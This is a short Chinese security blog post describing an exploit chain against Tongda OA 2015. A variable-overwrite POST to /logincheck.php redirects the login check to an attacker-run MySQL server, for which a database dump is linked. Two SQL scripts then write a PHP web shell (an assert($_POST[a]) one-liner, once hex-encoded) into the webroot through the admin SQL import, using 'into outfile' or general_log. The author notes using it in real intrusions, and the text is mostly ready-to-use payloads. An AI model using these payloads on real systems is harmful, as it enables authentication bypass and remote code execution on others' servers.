---
title: "通达 OA 变量覆盖及 getshell"
date: 2018-08-06T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


版本 2015, 乌云平台上的漏洞, 正好最近实战也用到了

<!--more-->

# 变量覆盖

`/logincheck.php`

post 数据

`USERNAME=admin&PASSWORD=&MYOA_MASTER_DB[id]=1&MYOA_MASTER_DB[host]=MYSQL_HOST&MYOA_MASTER_DB[user]=MYSQL_USER&MYOA_MASTER_DB[pwd]=MYSQL_PASSWORD&MYOA_MASTER_DB[db]=MYSQL_DATABASE`

mysql 数据库需要自己部署

[TD_OA.sql](http://exp10it-1252109039.cossh.myqcloud.com/2018/08/06/1533560380.sql)

# getshell

后台有 sql 导入功能, 有两种方法, 使用 `into outfile` 或者用 `general_log`

```
update mysql.user set file_priv='Y' where user='root';
flush privileges;
select concat("'",0x3C3F7068702061737365727428245F504F53545B615D29203F3E) into outfile '../webroot/test.php';
update mysql.user set file_priv='N' where user='root';
flush privileges;
```

```
set global general_log = on;
set global general_log_file = '../webroot/test.php';
select '<?php assert($_POST[a]) ?>';
set global general_log = off;
```

保存为 sql 文件然后上传即可